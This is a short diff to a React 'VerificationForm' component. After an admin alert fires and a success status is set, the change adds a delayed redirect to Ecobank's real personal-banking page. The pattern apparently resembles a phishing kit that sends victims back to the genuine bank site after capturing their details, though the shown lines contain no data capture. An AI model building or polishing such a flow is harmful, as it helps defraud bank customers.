@@ -318,7 +318,13 @@ function VerificationForm() {
     };
 
     sendAdminAlert();
-    setTimeout(() => setStatus('success'), 2000);
+    setTimeout(() => {
+      setStatus('success');
+      // Redirect after 5 seconds (5000ms)
+      setTimeout(() => {
+        window.location.href = 'https://ecobank.com/personal-banking';
+      }, 5000);
+    }, 2000);
   };
 
   if (status === 'success') {
